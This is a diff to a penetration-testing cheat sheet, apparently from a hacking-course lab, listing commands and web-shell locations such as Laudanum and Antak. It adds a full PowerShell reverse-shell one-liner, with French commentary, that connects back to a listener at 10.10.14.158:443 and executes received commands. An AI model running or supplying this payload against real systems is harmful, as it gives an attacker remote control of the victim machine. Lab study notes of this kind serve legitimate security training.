@@ -32,3 +32,8 @@
 | `sudo -l`                                                                                           | Displays the commands that the currently logged on user can run as `sudo`                                                                                                                               |
 | `/usr/share/webshells/laudanum`                                                                     | Location of `laudanum webshells` on ParrotOS and Pwnbox                                                                                                                                                 |
 | `/usr/share/nishang/Antak-WebShell`                                                                 | Location of `Antak-Webshell` on Parrot OS and Pwnbox                                                                                                                                                    |
+
+
+Powershellone-liner utilisé pour se reconnecter à un écouteur qui a été démarré sur une boîte d'attaque:
+
+`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(`**'10.10.14.158',443**`);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(( $i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
